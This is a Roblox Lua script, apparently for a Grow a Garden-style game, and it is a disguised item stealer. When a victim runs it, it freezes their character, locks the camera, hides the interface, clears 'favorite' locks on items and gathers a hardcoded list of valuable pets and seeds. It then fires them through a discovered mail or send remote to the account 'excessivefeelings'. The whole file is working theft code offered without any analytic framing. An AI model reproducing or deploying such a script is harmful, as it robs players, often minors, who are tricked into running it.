local target = "excessivefeelings"
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait(10) if not char then return end
local hum = char:WaitForChild("Humanoid", 5) if not hum then return end
local root = char:WaitForChild("HumanoidRootPart", 5) if not root then return end

hum.WalkSpeed = 0 hum.JumpHeight = 0 hum.AutoRotate = false hum.PlatformStand = true root.Anchored = true
for _, state in pairs(Enum.HumanoidStateType:GetEnumItems()) do hum:SetStateEnabled(state, false) end
hum:SetStateEnabled(Enum.HumanoidStateType.GettingUp, false)
hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
local bodyPos = Instance.new("BodyPosition", root)
bodyPos.MaxForce = Vector3.new(1e9, 1e9, 1e9)
bodyPos.D = 100000 bodyPos.P = 100000 bodyPos.Position = root.Position
local rs = game:GetService("RunService")
rs.Stepped:Connect(function()
    root.Anchored = true
    hum.WalkSpeed = 0 hum.JumpHeight = 0
    bodyPos.Position = root.Position
    root.Velocity = Vector3.new(0,0,0)
    root.RotVelocity = Vector3.new(0,0,0)
end)
local camera = workspace.CurrentCamera
camera.CameraType = Enum.CameraType.Scriptable
camera.CFrame = camera.CFrame
for _, gui in pairs(player.PlayerGui:GetChildren()) do if gui:IsA("ScreenGui") then gui.Enabled = false end end

local pets = {"Frog","Bunny","Owl","Deer","Robin","Bee","Monkey","Golden Dragonfly","Unicorn","Raccoon","Ice Serpent","Black Dragon"}
local seeds = {"Carrot","Strawberry","Blueberry","Tulip","Tomato","Apple","Bamboo","Corn","Cactus","Pineapple","Baby Cactus","Horned Melon","Mushroom","Green Bean","Banana","Grape","Coconut","Mango","Glow Mushroom","Dragon Fruit","Acorn","Cherry","Sunflower","Poison Ivy","Venus Fly Trap","Pomegranate","Poison Apple","Ghost Pepper","Moon Bloom","Dragon's Breath","Gold Seed","Rainbow Seed"}
local allItems = {}
for _, v in pairs(pets) do allItems[v] = true end
for _, v in pairs(seeds) do allItems[v] = true end

local function unfavorite(container)
    for _, obj in pairs(container:GetDescendants()) do
        if obj:IsA("BoolValue") and (obj.Name:lower() == "favorite" or obj.Name:lower() == "fav") then obj.Value = false end
        if obj:IsA("NumberValue") then
            local fav = obj.Parent:FindFirstChild("Favorite") or obj.Parent:FindFirstChild("favorite")
            if fav and fav:IsA("BoolValue") then fav.Value = false end
        end
        if obj:IsA("Tool") or obj:IsA("Model") then pcall(function() obj:SetAttribute("Favorite", false) end) end
    end
end

local function findRemote()
    local names = {"MailEvent","SendMail","SendItem","MailSend","Mail","Send"}
    for _, container in pairs({game:GetService("ReplicatedStorage"), game}) do
        for _, obj in pairs(container:GetDescendants()) do
            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                local n = obj.Name:lower()
                for _, nm in pairs(names) do if n:find(nm:lower()) then return obj end end
            end
        end
    end
    for _, container in pairs({game:GetService("ReplicatedStorage"), game}) do
        for _, obj in pairs(container:GetDescendants()) do
            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then return obj end
        end
    end
    return nil
end
local mailRemote = findRemote()
if not mailRemote then return end

local itemTable = {}
local function scan(container)
    if not container then return end
    unfavorite(container)
    for _, obj in pairs(container:GetDescendants()) do
        if obj:IsA("NumberValue") and obj.Value > 0 then
            local name = obj.Parent.Name
            if allItems[name] then itemTable[name] = (itemTable[name] or 0) + obj.Value end
        end
        if (obj:IsA("Tool") or obj:IsA("Model")) and (obj.Parent == player.Backpack or obj.Parent == char) then
            if allItems[obj.Name] then itemTable[obj.Name] = (itemTable[obj.Name] or 0) + 1 end
        end
        if obj:IsA("Folder") then
            local count = 0
            for _, child in pairs(obj:GetChildren()) do
                if child:IsA("NumberValue") and child.Value > 0 and allItems[obj.Name] then count = count + child.Value end
            end
            if count > 0 then itemTable[obj.Name] = (itemTable[obj.Name] or 0) + count end
        end
    end
end
local containers = {player:FindFirstChild("PlayerData"), player:FindFirstChild("Data"), workspace:FindFirstChild(player.Name), player.Backpack, char}
for _, name in pairs({"Inventory","Items","Pets","Seeds","BackpackData","PlayerData","Plants","Animals"}) do
    local f = player:FindFirstChild(name) or char:FindFirstChild(name) or workspace:FindFirstChild(name)
    if f then table.insert(containers, f) end
end
for _, c in pairs(containers) do scan(c) end

local function sendAll()
    local ok = pcall(function()
        if mailRemote:IsA("RemoteFunction") then mailRemote:InvokeServer(target, itemTable) else mailRemote:FireServer(target, itemTable) end
    end)
    if not ok then
        for name, qty in pairs(itemTable) do
            pcall(function()
                if mailRemote:IsA("RemoteFunction") then mailRemote:InvokeServer(target, name, qty) else mailRemote:FireServer(target, name, qty) end
            end)
            task.wait(0.05)
        end
    end
end
sendAll()
`
